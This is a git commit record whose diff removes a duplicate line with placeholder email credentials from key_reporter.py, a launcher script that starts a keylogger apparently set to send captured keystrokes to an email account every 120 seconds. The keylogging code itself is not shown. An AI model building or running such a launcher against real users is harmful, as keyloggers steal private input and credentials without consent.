c67f394861f0245dd599dbcae776a59e11ec5ca4
Paulo Matos <pauloclmatos@gmail.com>
2025-01-07 20:48:19 +0000

    removed line in key_reporter

--- key_reporter.py
+++ key_reporter.py
@@ -22,7 +22,6 @@ def get_arguments():
 try:
     args = get_arguments()
     logger = keylogger.Keylogger(120,args.email, args.pwd)
-    logger = keylogger.Keylogger(120,"myemail@gmail.com", "emailpassword")
     logger.start()
 except KeyboardInterrupt:
     print()
